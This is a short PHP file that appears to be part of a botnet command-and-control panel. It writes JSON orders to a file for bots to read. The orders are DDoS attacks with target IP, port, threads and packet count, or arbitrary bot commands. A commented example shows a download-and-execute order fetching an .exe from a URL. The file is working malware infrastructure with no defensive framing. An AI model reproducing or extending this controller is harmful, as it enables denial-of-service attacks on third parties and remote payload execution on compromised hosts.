<?php

  //Fucntion for to save json:
  function Spend_saveFile($config_json){
    $config_file = fopen("py_files/bot_ccommands", "w");

    fwrite($config_file, $config_json);
    fclose($config_file);
  }

  //Function to transform command in json:
  function Spend_command($type, $command, $target_ip, $target_port, $target_threads, $target_packages){
    if($type == "ddos"){
      $config_array = array(
        "target_ip"   => $target_ip,
        "target_port" => $target_port,
        "threads"     => $target_threads,
        "packages"	  => $target_packages,
        "command"     => $command
      );

      //Encode command in json:
      $config_json = json_encode($config_array);

      Spend_saveFile($config_json);
    }
    elseif($type == "command"){
      $config_array = array(
        "target_ip"   => "Null",
        "target_port" => "Null",
        "threads"     => "Null",
        "packages"	  => "Null",
        "command"     => $command
      );

      $config_json = json_encode($config_array);

      Spend_saveFile($config_json);

    }

  }

//  Spend_command("command", 'Command_Bot.Dexec{"www.google.com/download.exe"}');
?>
